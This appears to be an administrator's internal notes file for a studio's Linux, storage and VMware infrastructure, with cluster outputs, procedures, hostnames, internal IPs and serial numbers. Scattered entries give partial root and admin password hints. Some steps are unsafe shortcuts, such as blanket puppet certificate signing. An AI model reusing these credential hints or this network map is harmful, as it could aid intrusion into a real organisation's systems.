  9|10.103.83.186  | OK  |    0|  26K|  26K|  32T/  60T( 54%)| 619G/ 1.1T( 56%)
 10|10.103.83.193  | OK  | 295K| 721K| 1.0M|  32T/  60T( 54%)| 618G/ 1.1T( 56%)
 11|10.103.83.182  | OK  |    0|    0|    0|  20T/  31T( 67%)| 131G/ 737G( 18%)
 12|10.103.83.194  | OK  |    0|  66K|  66K|  20T/  31T( 67%)| 131G/ 737G( 18%)
 13|10.103.83.195  | OK  |    0|  22K|  22K|  20T/  30T( 67%)| 131G/ 737G( 18%)
 14|10.103.83.196  | OK  |  428|  44K|  45K|  20T/  31T( 67%)| 131G/ 737G( 18%)
 15|10.103.83.197  | OK  |    0|  44K|  44K|  20T/  31T( 67%)| 130G/ 737G( 18%)
 99|10.103.83.183  | OK  |  10K|  26K|  36K|             (Diskless)            
-------------------+-----+-----+-----+-----+-----------------+-----------------
Cluster Totals:          |  78M| 170M| 248M| 423T/ 747T( 57%)| 6.7T/  14T( 46%)

     Health Fields: D = Down, A = Attention, S = Smartfailed, R = Read-Only     

Critical Events:

 10/17 22:01   C Job FSAnalyze has failed

Cluster Job Status:

Running jobs:                                                                   
Job                        Impact Pri Policy     Phase Run Time   
-------------------------- ------ --- ---------- ----- ---------- 
MediaScan[24177]           Medium 8   OFF_HOU... 5/7   179d 1:18 

No paused or waiting jobs.

Failed jobs:                                                                    
Job                        Errors Run Time   End Time        Retries Left 
-------------------------- ------ ---------- --------------- ------------ 
FSAnalyze[25810]           1      0:00:00    10/17 22:01:15  0 
TreeDelete[21118]          14     4:40:42    08/31 23:43:51  0 

Recent job results:                                                                                                                                     
Time            Job                        Event                          
--------------- -------------------------- ------------------------------ 
01/03 03:03:20  SnapshotDelete[26185]      Succeeded (MEDIUM) 
01/03 02:03:17  SnapshotDelete[26184]      Succeeded (MEDIUM) 
01/03 01:03:13  SnapshotDelete[26183]      Succeeded (MEDIUM) 
01/02 23:03:06  SnapshotDelete[26182]      Succeeded (MEDIUM) 
01/02 22:59:32  SmartPools[26181]          Succeeded (OFF_HOURS_High_inc_Weekend) 
01/02 03:01:59  SnapshotDelete[26180]      Succeeded (MEDIUM) 
01/02 02:02:00  SnapshotDelete[26179]      Succeeded (MEDIUM) 
01/02 01:01:52  SnapshotDelete[26178]      Succeeded (MEDIUM) 


@@@Chris suggested looking at the SMB status via the URL.... failed but tried it via CLI 

@@@ to check status

[root@axiom-10: ~]# isi services smb
Service 'smb' is enabled.

[root@axiom-10: ~]# isi services nfs 
Service 'nfs' is enabled.


axiom-5# isi services smb disable
The service 'smb' has been disabled.

axiom-5# isi services smb enable 
The service 'smb' has been enabled.

@@@seems to have fixed it (well MOST of it.... still some mount path errors)

@@@ /etc/exports like
isi nfs exports list  

@@@ for smb 
isi smb shares list 


((((()))))
17Jan17  Grace

Hi Grace - Here's a good DR test - I need to recover "mykey.pem" and "myreq.pem" from /disney/depts/tech/systems/certs/dts-vcs-e.disneytoonstudios.com.  I overwrote them about 10 minutes ago... HELP!!! :)

Grace Thompson to Joel, me
Jan 13 (4 days ago)

Sudo as root then

cd /disney/depts/tech/systems/certs/dts-vcs-e.disneytoonstudios.com/.snapshot

You'll see multiple directories in there: hourly, daily, weekly. These are snapshots from an hour, day, weeks ago. You can then retrieve your pem file from there. 

Let me know if that works

((((()))))
19Jan17  Grace  hammer


gracet [4:24 PM] 
you can use ‘hammer’ to do commandline satellite query

[root@chug ~]# hammer host list --hostgroup-id 10

run as root on “chug"

hammer cheat sheet

https://access.redhat.com/articles/2258471

----------------------------------------------------------
hammer --help
hammer hostgroup --help
hammer hostgroup list
       @@@shows that id "10" is equal to desktops (JETS)

[root@chug ~]# hammer hostgroup list
---|--------------|-------------------------------------|------------------|-------------|------
ID | NAME         | TITLE                               | OPERATING SYSTEM | ENVIRONMENT | MODEL
---|--------------|-------------------------------------|------------------|-------------|------
16 | AVMedia      | AVMedia                             |                  |             |      
1  | base         | base                                |                  | production  |      
4  | 6SERVER      | base/6SERVER                        | el66s            |             |      
5  | 6WORKSTATION | base/6WORKSTATION                   | el66             |             |      
12 | 6.7          | base/6WORKSTATION/6.7               | el67             |             |      
9  | JETS         | base/6WORKSTATION/JETS              |                  |             |      
10 | desktop      | base/6WORKSTATION/JETS/desktop      |                  |             |      
13 | hpc          | base/6WORKSTATION/JETS/hpc          | el66hpc          |             |      
11 | service      | base/6WORKSTATION/JETS/service      |                  |             |      
2  | 7SERVER      | base/7SERVER                        | el7s             |             |      
3  | 7WORKSTATION | base/7WORKSTATION                   | el72             |             |      
17 | TUMBL        | base/7WORKSTATION/TUMBL             |                  |             |      
19 | computenode  | base/7WORKSTATION/TUMBL/computenode |                  |             |      
18 | desktop      | base/7WORKSTATION/TUMBL/desktop     |                  |             |      
20 | reviewhosts  | base/7WORKSTATION/TUMBL/reviewhosts |                  |             |      
15 | Network      | Network                             |                  |             |      
6  | osx          | osx                                 | osx              | osx         |      
7  | unmanaged    | unmanaged                           | unmanaged        | production  |      
14 | 7server      | unmanaged/7server                   | el7s             |             |      
8  | windows      | windows                             | windows          |             |      
---|--------------|-------------------------------------|------------------|-------------|------

You can use the HAMMER PING command to check the status of core Satellite services. 
Together with the KATELLO-SERVICE STATUS command, this can help you to diagnose and troubleshoot Satellite issues.



((((()))))
15Feb17  GraceT isilon network timing

iperf numbers looks good 

iperf -c 10.106.231.202 -w 262144
------------------------------------------------------------
Client connecting to 10.106.231.202, TCP port 5001
TCP window size: 512 KByte (WARNING: requested 256 KByte)
------------------------------------------------------------
[ 3] local 10.106.231.180 port 44582 connected with 10.106.231.202 port 5001
[ ID] Interval Transfer Bandwidth
[ 3] 0.0-10.0 sec 11.0 GBytes 9.42 Gbits/sec


iperf -c 10.106.231.202 -w 262144
------------------------------------------------------------
Client connecting to 10.106.231.202, TCP port 5001
TCP window size: 512 KByte (WARNING: requested 256 KByte)
------------------------------------------------------------
[ 3] local 10.106.231.181 port 41972 connected with 10.106.231.202 port 5001
[ ID] Interval Transfer Bandwidth
[ 3] 0.0-10.0 sec 10.9 GBytes 9.39 Gbits/sec

((((()))))
15Feb17  --siggy NUKE "OpticalFlares"

in the directory /disney/apps/foundry/Nuke10.0v3 there was a file called "nuke.lic" The contents were 
old nuke licenses. When I added a stanza from dipper OpticalFlare" opened without an error. I re named 
the file FROM nuke.lic TO nuke.lic-ORIG and retested. Seems to work OK now.

16Feb17 it is broken again.......

@@@email from Amy
Here's the steps to reproduce the issue:

On el7(I tested on eagle.disneytoonstudios.com):
$ gig tumbl
$ run_nuke --gui (select Nuke10v03)
Then click on OpticalFlares button(Click on "other" button on the left panel -> All plugins -> O -> OpticalFlares. If there's an update button under All plugins, click on that and repeat this process)

dsiegfriedt@dts3329:~ $ run_nuke --gui 
Importing from publishtools
NUKE_PATH: /disney/apps/foundry/Nuke10.0v3/OpticalFlares/plugins
HIERO_PLUGIN_PATH: /disney/sw/os/Linux-3.10.0-x86_64/pkgs/nuketools/base/v1.0.5/00000001/lib64/python2.7/site-packages/hierotools
Segmentation fault (core dumped)
dsiegfriedt@dts3329:~ $ Nuke 10.0v3, 64 bit, built Jun 27 2016.
Copyright (c) 2016 The Foundry Visionmongers Ltd.  All Rights Reserved.
Disk cache /disk1/tmp/nuke/ViewerCache/??: 36MB (1% of 10240MB) used in 3 files.
*OF* Logging Enabled
*OF* Welcome to Optical Flares for NUKE 1.0.85, Instance ID: 0
*OF* Creating Instance: 0 **********
*OF* OF/nuke is expecting Presets and Textures in: $OPTICAL_FLARES_PATH/Textures-And-Presets
*OF* OF/nuke is expecting License Server at: 10.106.228.32:47200
*OF* UNABLE to acquire license from 10.106.228.32:47200
Op::error called with *OF* UNABLE to acquire license from 10.106.228.32:47200
                           ^^^^^^
*OF* NODE: 0 + attach()
*OF* NODE: 0 - detach()
*OF* Destroying instance: 0
*OF* Destroyed

/apps/foundry/plugins/Nuke10.0v3/plugins/OpticalFlares/1.0.85/server/vc_license_server  @@@mv to ORIG

@@@OpticalFlares is a /var/log/vc_license_server.log (Video Co-Pilot license) and we have "1"
@@@ on dipper

[root@dipper foundry]# tail /var/log/vc_license_server.log 
{SNIP}
2017-02-16@16:57:13: WARN: client 10.106.224.6 license timed-out
2017-02-16@16:57:13: INFO: License Status [0 of 1 used]


((((()))))
16Feb17  --siggy  adding other NOTES file
((((()))))
{{{VMWare}}}
4Jan17

the windows machines (in finance) all mount axiom from  a VM "dtsdfs".  Died over the Chistmas break (2016) and we were able to mount axiom by IP.

Legacy VMWare server supports a bunch (25 powered on) of VMs (some are needed....some are not... ALL should be migrated to new VMWare server.

https://10.103.83.10:9443 #(dts-esx-01.swna.wspr.disney.com:9443/vcenter-client)
$siggy

nslookup 10.103.83.10
10.83.103.10.in-addr.arpa	name = DTS-VCENTER.swna.wdpr.disney.com

@@@ a "$siggy" account is needed to login to the vmware server as it is WDAS property

@@@ dtsdfs is the VM you need to reboot to get finance back

@@@ Gisel's windows box has the thick client installed (if you can't reach vsphere via the web)

25Jul17  dtsdfs (can't access axiom from MAC)

axiom:/ifs/Disney/Users/michelle.booker

25Oct17  where is dtsdfs?

dts-esx-102.swna.wdpr.disney.com
login: root
PW: < see encryptes-file>

******************************************************************************************************
mail	  = mail.google.com

mail server = mailhub.disneytoonstudios.com

licensing = netsys.disneytoonstudios.com:3000 (monitoring)
	  = dipper.disneytoonstudios.com      (serving)

VLANs	  = netbox.disneytoonstudios.com

DTS	  = dtsweb.disneytoonstudios.com

git	  = gitlab.disneytoonstudios.com

satellite = satellite.disneytoonstudios.com

IDM	  = idm0[1-2].disneytoonstudios.com
	  = http://idm.disneytoonstudios.com
	  @@@ auth change by Grace to let me edit DNS 8Feb16

RHEV	  = rhevm.disneytoonstudios.com

NetApp	  = https://10.106.228.132 (mgmt) admin passwd=N0...
   FAS8020A-SP = 10.106.239.18
   FAS8020B-SP = 10.106.239.20


nest	       nest01	FAS8020A    721520000258
nest	       nest02	FAS8020A    721520000257
 
DTS-E2700-01		E-2700	    711426000123


to change IP on NetApp:

https://library.netapp.com/ecmdocs/ECMP1610202/html/network/interface/modify.html

nest::> network interface modify -home-port e0d -address 10.106.231.193 -lif nest_nfs_nfs_lif2a -netmask 255.255.252.0 -home-node nest-01 -status-admin up -vserver nest_nfs


nest_nfs
            nest_nfs_nfs_lif1 
                         up/up    10.106.231.190/22  nest-01       e0c     true
            nest_nfs_nfs_lif1a 
                         up/up    10.106.231.192/22  nest-01       e0d     false
            nest_nfs_nfs_lif2 
                         up/up    10.106.231.191/22  nest-02       e0c     false
            nest_nfs_nfs_lif2a 
                         up/up    10.106.231.193/22  nest-02       e0d     false



Isilon	  = axiom.dts.disney.com:8080 (servicing Windows) 
	  = corollary.disneytoonstudios.com:8080 (root K)
	  = theorem.disneytoonstudios.com:8008
	  = https://esrs.disneytoonstudios.com:9443 (admin N with a bang)
	  = Site ID : 16419467
	  = SN : ELMESR10167WFP   VER : 3.16.00.08


	  Login = root Passwd = K     	#2Feb17				9Feb17
	  = corollary  (dnscorollary)	      				10.106.231.199
	  = corollary-1 = 10.106.231.130 = 10.0.7.1 != 10.103.83.73	10.106.231.200
	  = corollary-2 = 10.106.231.131 = 10.0.7.2 != 10.103.83.74	10.106.231.201
	  = corollary-3 = 10.106.231.132 = 10.0.7.3 != 10.103.83.75	10.106.231.202
	  = corollary-4 = 10.106.231.133 = 10.0.7.4 != 10.103.83.76	10.106.231.203
	  = corollary-5 = 10.106.231.134 = 10.0.7.5 != 10.103.83.77	10.106.231.204
	  = corollary-6 = 10.106.231.135 = 10.0.7.6 != 10.103.83.72	10.106.231.205

To change IPs:
corollary.disneytoonstudios.com:8080 (root K)
Cluster Management
Network Configuration
Subnet1
edit basic settings
     change range
     	    submit


Google	  = admin.google.com

Confluence= atlas:8080

Jira	  = atlas:8090
	  = jira.disneytoonstudios.com

Slack	  = disneytoonstudios.slack.com

Zabbix	  = zabbix.disneytoonstudios.com
	  = mayday.disneytoonstudios.com:10051

VMWare	  = https://10.103.83.10:9443 (LEGACY) $siggy
	  = vsphere-prod-01.disneytoonstudios.com (root N0...)  10.106.228.27
	  = vcsa.disneytoonstudios.com (root N) 10.106.228.28 (esxi)
	      login: username@vsphere.local   passwd: your idm password
	  = https://10.106.228.28/vsphere-client/?csp (vcenter server)
	  = dts-vcenter.swna.wdpr.disney.com  (Windows)


	  = vmesxi-1.disneytoonstudios.com (root S3...) 10.106.228.26

PING	  = https://vmpingfederate:9999/pingfederate/app  (Administrator)

shotgun	  = shotgun.disneytoonstudios.com (in DMZ.... sudo su -, THEN ssh)

aspera	  = shipper.disneytoonstudios.com (10.106.235.75) (in DMZ.... sudo su -, THEN ssh)

ESRS	  = ssh esrs
	      (after making changes click "Request Update")
	      (can be updated.... is standalone and is not part of the custer)
******************************************************************************************************

12Jan17  --siggy  8020 fiber paths

FAS8020A
    e0a => FAS8020B/e0a
    e0b => FAS8020B/e0b

FAS8020B
    e0a => FAS8020A/e0a
    e0b => FAS8020B/e0b


FAS8020A
    e0c => 102.1-13/14 => 205.2A => 3-33
    e0d => 103.1-11    => 205.1A => 3-30

FAS2080B
    e0c => 102.1-15/16 => 205.2A => 4-33
    e0d => 103.1-12/13 => 205.1A => 4-30
 
******************************************************************************************************
12Jan17  Gracet

http://aspera.disneytoonstudios.com/aspera/user/
dnegtumble


VMWare server
https://10.103.83.10:9443/vsphere-client/#
login with "$" account



******************************************************************************************************
Stuart McDougal <stuart.mcdougal@disneyanimation.com>
11:29 AM (0 minutes ago)

to Grace, Chris, me
Hey Grace,

Chris got me in.

The mariadb (mysql) full backups are located on the slave vmmariadb2:/DB/mariadb_backup/p3306/full.  

For Postgres - there are several instances, editorial, dpix, gitlab, etc ... backups are found corresponding to the port instanance.  vmpostgres1:/DB/pgsql_backup/[port number]/full  I didn't set up the slave for postgres, but vmpostgres2 is for that purpose.

For CODA (maria).  Backups run on the slave vmcodadb2:/DB/mariadb/10.0/p3306/backup.  I;m not sure why I wasn't consistent with the backup location, but I think we used it's current structure here at DAS.  The location can easily be changed to be consistent with vmpostgres and vmmariadb

******************************************************************************************************
25Jan17  Grace getting errors while building a RHEL7 machine

@@@ see also NOTES-IPA (if /disney is empty)

gracet [10:59 AM]
Look at logs /disney/dist/linux/logs/.../.../hostname
[10:59]
Install.post.log
don.siegfriedt [11:20 AM]
OK... went there and found:
Running in chroot, ignoring request.
kinit: Key table file '/root/keytab.idmadmin' not found while getting initial credentials
ipa: ERROR: did not receive Kerberos credentials

gracet [11:36 AM]
Does /root/keytab exist?
[11:37]
cat ~gracet/docs/idm/idm_regist
# adds public ssh key to idm host record
systemctl start sshd
@@@ optional domainname disneytoonstudios.com
/usr/bin/kinit -k -t /root/keytab.idmadmin idmadmin
/usr/bin/ipa host-mod --sshpubkey="`cat /etc/ssh/ssh_host_rsa_key.pub`" --updatedns "<hostname>.disneytoonstudios.com"

# configure automount
/usr/sbin/ipa-client-automount --unattended


On how to force keytab initiation
[11:37]
Then reboot
[11:37]
Let puppet run
[11:38]
It will install all kinds of stuff
[11:38]
Other option is to delete the host entry in satellite then build the workstation as if its a brand new machine

12Feb18  
*****NOTE****
whne you delete from satellite and still have trouble building.  Check that DNS (forward and reverse) are truely deleted.  We (Grace) found double reverse entries for dts3477


7Jun17
https://ask.puppet.com/question/22478/exiting-no-certificate-found-and-waitforcert-is-disabled/

sudo puppet cert list
sudo puppet cert sign --all

10Jul17
@@@ bearcat would not build completely (no errors) just nothing in /disney.  Grace found that "vmopt" was down, 
@@@ once rebooted bearcat built completely


@@@ my steps to get it online (NOT recommended)
/disney is empty
mkdir /disney/dist
mount theorem.disneytoonstudios.com:/ifs/data/disney/dist /disney/dist
puppet agent --test
@@@ once you are online it makes it easier to perform the idm re-register (above)


21Jul17 gdm would not start on dts3515 (Kadie's machine)
@@@ wrong DM was enabled

[root@dts3515 ~]# systemctl is-enabled gdm
disabled

[root@dts3515 ~]# systemctl enable gdm
Failed to execute operation: File exists

[root@dts3515 ~]# systemctl disable gdm

[root@dts3515 ~]# systemctl is-enabled gdm
disabled

[root@dts3515 ~]# ll /etc/systemd/system
...
lrwxrwxrwx. 1 root root   39 Jul 17 17:00 display-manager.service -> /usr/lib/systemd/system/lightdm.service
...

[root@dts3515 systemd]# systemctl is-enabled lightdm
enabled

[root@dts3515 systemd]# systemctl disable lightdm
Removed symlink /etc/systemd/system/display-manager.service.

systemctl stop lightdm

[root@dts3515 systemd]# systemctl enable gdm
Created symlink from /etc/systemd/system/display-manager.service to /usr/lib/systemd/system/gdm.service.

4Jan18

@@@ check for links

ll /etc/systemd/system


******************************************************************************************************
27Jan17  --siggy  mouse mapping on tempest (tleavitt)

xinput --set-button-map 8 1 3 0 4 5 0 0 0 2 0 0
@@@ so the first number is the device
@@@ to get the device number
xinput --list
@@@ his mouse happen to be device 10.... we changed the first number (from 8 to 10) and it worked

******************************************************************************************************
30Jan17  EFin RHEV hoops to jump through

We have a bit of a mess.  The Virt-v2v domain was in-active.  I think because bulldog (which is where the 
virt-v2v volume is exported from) was rebooted and it didn't re-export upon the reboot (something to 
investigate why).  I ran 'exportfs -a' on bulldog and then activated it in rhev.  I think now we'll have 
to manually clean up the snapshots for the backups that have been failing.  Next is Datastore_Prod04 is full 
(actually all volumes have filled up).  Probably because of the snapshots.  I tried removing one of the 
snapshots and rhev wouldn't allow me.  Now it appears that all storage domains are marked as red.  
vm's are up, but the snapshots are all marked red now.  Let me talk with Paul T. to see if we can get the 
backups to stop and the proceed from there.

******************************************************************************************************
3Feb17  Grace (email)  install RGS

RGS Sender install: 

/disney/depts/tech/systems/software/rgs/linux/7.2.4/lin64/sender/install.sh 

Edit /etc/X11/xorg.conf.d/99-nvidia-modules , then add the line, Load "rge"  

Section "Module"
    Disable "glamoregl"
    Load "rge"
EndSection

******************************************************************************************************
6Feb17  Steve   RHEV notifications setup

Steve Carpenter
Feb 3 (3 days ago)

to Grace, Paul, me 
Here's something you guys might try...  set up event notifications.  This is what I did at wdas.  It should be similar on skipper except the mail server would be different.  Just don't put quotes around the mail server name - which derailed me for a while.

See Administration Guide
  https://ringmaster.fas.fa.disney.com/ovirt-engine/docs/manual/en_US/html/Administration_Guide/chap-Event_Notifications.html

16.3. Parameters for Event Notifications in ovirt-engine-notifier.conf

Added to /etc/ovirt-engine/notifier/notifier.conf.d/11-setup-notifications.conf:
# NOTE: No quotes for MAIL_SERVER
MAIL_SERVER=mailhub.fa.disney.com

Added to /usr/share/ovirt-engine/services/ovirt-engine-notifier/ovirt-engine-notifier.conf:

# MAIL_SERVER overridden in 11-setup-notifications.conf
MAIL_SERVER=
MAIL_FROM=root@ringmaster.fas.fa.disney.com
MAIL_REPLY_TO=tech-datacenter@disneyanimation.com
MAIL_USER=root@ringmaster.fas.fa.disney.com
SSL_PROTOCOL=TLS

[root@ringmaster ovirt-engine-notifier]# systemctl start ovirt-engine-notifier.service
[root@ringmaster ovirt-engine-notifier]# systemctl status ovirt-engine-notifier.service
● ovirt-engine-notifier.service - oVirt Engine Notifier
   Loaded: loaded (/usr/lib/systemd/system/ovirt-engine-notifier.service; disabled; vendor preset: disabled)
   Active: active (running) since Wed 2016-09-21 16:47:29 PDT; 1min 5s ago
 Main PID: 11562 (ovirt-engine-no)
   CGroup: /system.slice/ovirt-engine-notifier.service
           ├─11562 /usr/bin/python /usr/share/ovirt-engine/services/ovirt-engine-notifier/ovirt-engine-notifier.py --redirect-output --systemd=notify start
           └─11658 ovirt-engine-notifier -Djboss.modules.write-indexes=false -Djava.util.logging.config.file=/usr/share/ovirt-engine/conf/notifier-logging.proper...

Sep 21 16:47:28 ringmaster systemd[1]: Starting oVirt Engine Notifier...
Sep 21 16:47:29 ringmaster systemd[1]: Started oVirt Engine Notifier.

Now, goto the Users resource tab in rhev.
Click Event Notifier tab.
Click Manage Events and open the Add Event Notification window.
Select your event notifications.

------------------------------------------------------------------

[root@skipper notifier.conf.d]# pwd
/etc/ovirt-engine/notifier/notifier.conf.d
[root@skipper notifier.conf.d]# cat 11-setup-notifications.conf
# NOTE: No quotes for MAIL_SERVER
MAIL_SERVER=mailhub.disneytoonstudios.com


cat /usr/share/ovirt-engine/services/ovirt-engine-notifier/ovirt-engine-notifier.conf

...

# Specifies 'from' address on sent mail in RFC822 format, if supported by mail server.
MAIL_FROM=root@skipper.disneytoonstudios.com

# Specifies 'reply-to' address on sent mail in RFC822 format.
MAIL_REPLY_TO=don.siegfriedt@disneytoonstudios.com

...

RHEV
  Users (Tab at top)
    Highlight username
      "Event Notifier" Tab (Middle)
        Manage Events (middle Left)
	  select which events you want to be notified about


******************************************************************************************************
7Feb17  When opening a EMC ticket 

they are going to want:

S/N of the node
Corollary
NODE0 SS200-301151-0371 10.106.213.130
NODE1 SS200-301149-0130 10.106.213.131
NODE2 SS200-301151-0370 10.106.213.132
NODE3 SS200-301151-0361 10.106.213.133
NODE4 SS200-301203-0112 10.106.213.134
NODE5 SS200-301219-0068 10.106.213.135

Theorem
Login = root Passwd = N     	#7Feb17
Name:	theorem-1.disneytoonstudios.com
Address: 10.106.231.1
Node serial number: SX400-201323-0110

Name:	theorem-2.disneytoonstudios.com
Address: 10.106.231.2
Node serial number: SX400-201323-0111

Name:	theorem-3.disneytoonstudios.com
Address: 10.106.231.3
Node serial number: SX400-201323-0104

Name:	theorem-4.disneytoonstudios.com
Address: 10.106.231.4
Node serial number: SX400-201323-0112

Name:	theorem-5.disneytoonstudios.com
Address: 10.106.231.5
Node serial number: SX400-201323-0105

Name:	theorem-6.disneytoonstudios.com
Address: 10.106.231.6
Node serial number: SX400-201328-0036

Name:	theorem-7.disneytoonstudios.com
Address: 10.106.231.7
Node serial number: SN400-201324-0008

Name:	theorem-8.disneytoonstudios.com
Address: 10.106.231.8
Node serial number: SN400-201324-0006

Name:	theorem-9.disneytoonstudios.com
Address: 10.106.231.9
Node serial number: SN400-201324-0005

Name:	theorem-10.disneytoonstudios.com
Address: 10.106.231.120
Node serial number: SN400-201324-0007

Name:	theorem-11.disneytoonstudios.com
Address: 10.106.231.121
Node serial number: SN400-201324-0009

Name:	theorem-12.disneytoonstudios.com
Address: 10.106.231.123
Node serial number:

Reserved for theorem 10.106.231.1 to 10.106.231.150

***************** ((( serial number can be found 31May18))) *******************

Axiom

Isilon Commands:

isi_for_array –n4 isi devices
isi_for_array –n4 isi_hw_status
isi_for_array –n4 isi_radish –q

isi nfs exports check
isi nfs exports list --verbose
isi status
isi_for_array -s "isi_hw_status|egrep 'Ser|Prod';echo"
isi smb sessions list
isi nfs nlm sessions list
isi pkg info

isi device list (will give you individule status on drive (of the node you are logged into))


@@@ drive location (19Jun17)
https://www.youtube.com/watch?v=_i3RBTvrB2o


@@@ plugging new (additional) drives into chug (19Jun17)
If the drives have burgundy coloured tags on them they are hot pluggable


http://emctricks.blogspot.com/2015/01/how-to-replace-isilon-drive.html
How to replace an Isilon Drive

uname -r

isi pkg info

isi status


isi devices drive list             
Lnn  Location  Device    Lnum  State   Serial        
-----------------------------------------------------
12   Bay  1    /dev/da1  35    HEALTHY PN1134P6J26A3W
12   Bay  2    /dev/da2  34    HEALTHY PN2134P6J10Z9T
12   Bay  3    /dev/da19 17    HEALTHY PN2134P6J204HT
12   Bay  4    -         N/A   REPLACE -             
12   Bay  5    /dev/da3  33    HEALTHY PN2134P6J0KRWT
{SNIP}

theorem-12# isi device drive smartfail 4   
You are about to smartfail drive bay4, on node lnn 12. Are you sure? (yes/[no]): yes

@@@ when this finishes you can now replace the defective drive

theorem-12# isi device drive add 4      
You are about to add drive bay4, on node lnn 12. Are you sure? (yes/[no]): yes
Initiating add on bay4
. . . .

The drive in bay4 was not added to the file system because it is not formatted. Format the drive to add it to the file system by running the following command, where <bay> is the bay number of the drive: isi devices drive format <bay>

theorem-12# isi devices drive format 4
You are about to format drive bay4, on node lnn 12. Are you sure? (yes/[no]): yes

#remove drive 1st then issue these commands:

theorem-12# isi device drive add 4    
You are about to add drive bay4, on node lnn 12. Are you sure? (yes/[no]): yes
Initiating add on bay4

The add operation is in-progress. A OneFS-formatted drive was found in bay4 and is being added to the file system. Wait a few minutes and then list all drives to verify that the add operation completed successfully.
theorem-12# 

@@@disk location....
https://support.emc.com/docu44415_X400-Drive-Replacement-Guide.pdf?language=en_US
isi devices -a format -d 6:33

@@@check with
isi devices


16Mar17  --siggy

Maxim

ssh root@maxim   K...

dsiegfriedt@dts3329:~ $ nslookup maxim-1
Name:	maxim-1.swna.wdpr.disney.com
Address: 10.103.83.41

dsiegfriedt@dts3329:~ $ nslookup maxim-2
Name:	maxim-2.swna.wdpr.disney.com
Address: 10.103.83.42

dsiegfriedt@dts3329:~ $ nslookup maxim-3
Name:	maxim-3.swna.wdpr.disney.com
Address: 10.103.83.43

dsiegfriedt@dts3329:~ $ nslookup maxim-4
Name:	maxim-4.swna.wdpr.disney.com
Address: 10.103.83.44

Postulate

17Mar17  --siggy
@@@ to delate all data
https://ip-life.net/isilon-delete-directory
/
isi job jobs start --type=treedelete --paths="</ifs/data/directory-path"

@@@ other URLs for decommisioning clusters
http://sapsg.blogspot.com/2012/11/isilon.html
http://psg.skinforum.org/isilon.html
http://isilonblogspot.blogspot.com/2013/11/isilon-storage-and-solutions-provide-in.html
http://storageteknologi.blogspot.com/2015/04/isilon-command-cheat-sheet.html

https://docs.google.com/document/d/1i2sPeLrtN5b2VAcAwjdpKglnlzEAtRylO_APY20Cats/edit

@@@ Sys Admin Pocket Survival Guide - Isilon
http://psg.skinforum.org/isilon.html

******************************************************************************************************
7Feb17  superfortress change

cd /etc/modprobe.d/
vim sunrpc.conf

cat /etc/modprobe.d/sunrpc.conf 
options sunrpc tcp_max_slot_table_entries=128

******************************************************************************************************
7Feb17  Google drive share

Google Drive
  Shared with me
    DTS IP Space
      has all the IPs used @ 833 Sonora
******************************************************************************************************
8Feb17  corollary on superfortress

mount
corollary:ifs/Transfer on /corollary/tests type nfs (rw,relatime,vers=3,rsize=65536,wsize=65536,namlen=255,hard,proto=tcp,
timeo=600,retrans=2,sec=sys,mountaddr=10.106.231.135,mountvers=3,mountport=300,mountproto=udp,local_lock=none,addr=10.106.231.135)

fstab
# Corollary
corollary:ifs/Transfer /corollary/tests         nfs     rsize=65536,wsize=65536        0 0

******************************************************************************************************
9Feb17  --siggy superfortress speed testing

[root@superfortress ~]# time cp -r /tmp/DOCs/ /corollary/tests/siggy/

real	0m0.237s
user	0m0.002s
sys	0m0.026s
[root@superfortress ~]# 

[root@superfortress ~]# time dd if=/dev/zero of=/corollary/tests/siggy/testfile_64k bs=64k count=46384
46384+0 records in
46384+0 records out
3039821824 bytes (3.0 GB) copied, 11.9581 s, 254 MB/s

real	0m11.964s
user	0m0.008s
sys	0m2.617s
[root@superfortress ~]# 

[root@superfortress ~]# time dd if=/corollary/tests/siggy/testfile_64k of=/dev/null bs=64k
46384+0 records in
46384+0 records out
3039821824 bytes (3.0 GB) copied, 5.90667 s, 515 MB/s

real	0m5.909s
user	0m0.010s
sys	0m1.922s
[root@superfortress ~]# 

@@@From Grace
My notes when I tuned superfortress a couple of weeks back /disney/home/gracet/docs/10Gb
@@@ copied to ~/JOBS/DISNEY


******************************************************************************************************
15Feb17 Amy/Grace/  --siggy   DTS rpm make

@@@start
http://gitlab/dts/templateproject/tree/master/your-repo-name

@@@make/push repo
http://gitlab/dts/templateproject/blob/master/your-repo-name/Makefile

# Linux Specific Local Deployment Targets
# If /disk1 run out of space, use the following or any directory that has a lot of space
#rpmtopdir = /disney/users/$(USER)/rpmbuild-$(USER)
rpmtopdir = /disk1/scratch/rpmbuild-$(USER)
cleanrpm:
	rm -rf $(rpmtopdir)/RPMS/$(ARCH)/$(RPM_PACKAGE_NAME)-*
	rm -rf $(rpmtopdir)/SRPMS/$(RPM_PACKAGE_NAME)-*

rpm: 
	git-make-rpm --topdir $(rpmtopdir)

rpm-dirty: clean
	git-make-rpm --topdir $(rpmtopdir) --dirty

# cleanrpm first so that "rpmbuild" is empty
rpmdeploy: cleanrpm rpm
	rpmdeploy $(rpmtopdir)/RPMS/$(ARCH)/$(RPM_PACKAGE_NAME)-*

18May17

cd ~/JOBS/DISNEYTS/GIT/deadline
@@@ make sure up to date
git pull
@@@ you can edit the Makefile or the spec.in file
@@@ and commit your changes

git commit -m "comment of the changes" <filename>

git push -u origin master

*******************************
@@@ ALSO see ~DOCs/NOTES-GIT
*******************************

2Jan18   open-vm-tools added by puppet

dsiegfriedt@dts3329:~/puppet $ git pull
remote: Counting objects: 19, done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 19 (delta 8), reused 0 (delta 0)
Unpacking objects: 100% (19/19), done.
From gitlab.disneytoonstudios.com:linux/puppet
   217e5a7..7c6367c  master     -> origin/master
Updating 217e5a7..7c6367c
Fast-forward
 hieradata/production/node/vmprodmanstage.yaml | 3 ++-
 hieradata/production/os/workstation/7.2.yaml  | 1 +
 2 files changed, 3 insertions(+), 1 deletion(-)

dsiegfriedt@dts3329:~/puppet $ vi hieradata/production/common.yaml

dsiegfriedt@dts3329:~/puppet $ git commit -m "added open-vm-tools to common.yaml" hieradata/production/common.yaml
[master 655a06f] added open-vm-tools to common.yaml
 1 file changed, 1 insertion(+)

dsiegfriedt@dts3329:~/puppet $ git push -u origin master
Counting objects: 5, done.
Delta compression using up to 12 threads.
Compressing objects: 100% (4/4), done.
Writing objects: 100% (5/5), 542 bytes | 0 bytes/s, done.
Total 5 (delta 1), reused 0 (delta 0)
To git@gitlab.disneytoonstudios.com:linux/puppet
   7c6367c..655a06f  master -> master
Branch master set up to track remote branch master from origin.

3Jan18  @@@ had to remove it 

******************************************************************************************************
((((()))))
21Feb17   DR info 

****************From Matt S.

Regarding DTS and this might be old information.  This might not necessarily be helpful to the cause but helpful.

